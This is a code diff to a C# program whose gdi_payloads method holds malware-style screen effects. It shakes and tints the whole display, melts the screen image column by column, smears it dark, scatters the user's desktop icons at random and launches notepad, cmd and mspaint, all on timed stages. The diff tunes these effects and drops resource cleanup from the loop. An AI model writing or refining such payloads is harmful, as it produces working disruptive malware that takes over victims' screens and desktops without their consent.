@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Drawing;
+using System.Drawing.Drawing2D;
 using System.IO;
 using System.Linq;
 using System.Media;
@@ -45,6 +46,7 @@ namespace Silic5
         }
         public void gdi_payloads()
         {
+            Thread.Sleep(5000);
             Stopwatch sw = Stopwatch.StartNew();
             bool processesStarted = false;
             int stage = 1;
@@ -52,13 +54,15 @@ namespace Silic5
             int x = Screen.PrimaryScreen.Bounds.Width; int y = Screen.PrimaryScreen.Bounds.Height;
             int left = Screen.PrimaryScreen.Bounds.Left, right = Screen.PrimaryScreen.Bounds.Right, top = Screen.PrimaryScreen.Bounds.Top, bottom = Screen.PrimaryScreen.Bounds.Bottom;
             POINT[] lppoint = new POINT[3];
+            IntPtr hdc = GetDC(IntPtr.Zero);
+            IntPtr mhdc = CreateCompatibleDC(hdc);
+            IntPtr hbit = CreateCompatibleBitmap(hdc, x, y);
+            IntPtr holdbit = SelectObject(mhdc, hbit);
+            bool stage2Init = false;
+            int[] melt = new int[x];
             while (true)
             {
                 r = new Random();
-                IntPtr hdc = GetDC(IntPtr.Zero);
-                IntPtr mhdc = CreateCompatibleDC(hdc);
-                IntPtr hbit = CreateCompatibleBitmap(hdc, x, y);
-                IntPtr holdbit = SelectObject(mhdc, hbit);
                 IntPtr handle = Dll_Imports.FindWindow("Progman", null);
                 handle = Dll_Imports.FindWindowEx(handle, IntPtr.Zero, "SHELLDLL_DefView", null);
                 handle = Dll_Imports.FindWindowEx(handle, IntPtr.Zero, "SysListView32", null);
@@ -66,14 +70,18 @@ namespace Silic5
                 FileInfo[] finfo = dirinfo.GetFiles();
                 for (int num = 0; num <= finfo.Length + 2; num++)
                 {
-                    Dll_Imports.SendMessage(handle, Dll_Imports.LVM_SETITEMPOSITION, (IntPtr)num, Dll_Imports.MakeLParam(r.Next(x), r.Next(y)));
                     int rand = r.Next(y);
                     if (stage == 1)
                     {
                         BitBlt(mhdc, 0, 0, x, y, hdc, 0, 0, TernaryRasterOperations.SRCCOPY);
+                        using (Graphics g = Graphics.FromHdc(mhdc))
+                        using (SolidBrush brush = new SolidBrush(Color.FromArgb(18, 100, 10, 10)))
+                        {
+                            g.FillRectangle(brush, 0, 0, x, y);
+                        }
                         AlphaBlend(hdc, r.Next(-7, 7), r.Next(-7, 7), x, y, mhdc, 0, 0, x, y, new BLENDFUNCTION(0, 0, 70, 0));
-
-                        if (sw.ElapsedMilliseconds >= 35000)
+                        Dll_Imports.SendMessage(handle, Dll_Imports.LVM_SETITEMPOSITION, (IntPtr)num, Dll_Imports.MakeLParam(r.Next(x), r.Next(y)));
+                        if (sw.ElapsedMilliseconds >= 30000)
                         {
                             stage = 2;
                             sw.Restart();
@@ -81,10 +89,25 @@ namespace Silic5
                     }
                     else if (stage == 2)
                     {
-                        BitBlt(hdc, rand, r.Next(-100, 100), r.Next(200), y, hdc, rand, 0, TernaryRasterOperations.SRCCOPY);
-
-                        if (sw.ElapsedMilliseconds >= 40000)
+                        if (!stage2Init)
                         {
+                            BitBlt(mhdc, 0, 0, x, y, hdc, 0, 0,
+                                   TernaryRasterOperations.SRCCOPY);
+
+                            stage2Init = true;
+                        }
+
+                        for (int i = 0; i < x; i++)
+                        {
+                            if (r.Next(2) == 0)    
+                            melt[i] += r.Next(2, 8);
+                            BitBlt(hdc, i, melt[i], 1, y - melt[i], mhdc, i, 0, TernaryRasterOperations.SRCCOPY);
+                        }
+
+                        if (sw.ElapsedMilliseconds >= 43000)
+                        {
+                            BitBlt(mhdc, 0, 0, x, y, hdc, 0, 0,
+       TernaryRasterOperations.SRCCOPY);
                             stage = 3;
                             sw.Restart();
                         }
@@ -93,24 +116,19 @@ namespace Silic5
                     {
                         if (!processesStarted)
                         {
+                            BitBlt(hdc, 0, 0, x, y, mhdc, 0, 0, TernaryRasterOperations.SRCCOPY);
                             Process.Start("notepad.exe");
                             Process.Start("cmd.exe");
                             Process.Start("mspaint.exe");
                             processesStarted = true;
                         }
-                        StretchBlt(hdc, (r.Next(2) == 1) ? -10 : 10, (r.Next(2) == 1) ? -10 : 10, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCAND);
+                        StretchBlt(hdc, (r.Next(2) == 1) ? -1 : 1, (r.Next(2) == 1) ? -1 : 1, x, y, hdc, 0, 0, x, y, TernaryRasterOperations.SRCAND);
 
-                        if (sw.ElapsedMilliseconds >= 95000)
+                        if (sw.ElapsedMilliseconds >= 92000)
                         {
                             break;
                         }
                     }
-                    SelectObject(mhdc, holdbit);
-                    DeleteObject(holdbit);
-                    DeleteObject(hbit);
-                    DeleteDC(mhdc);
-                    DeleteDC(hdc);
-                    Thread.Sleep(10);
                 }
             }
         }
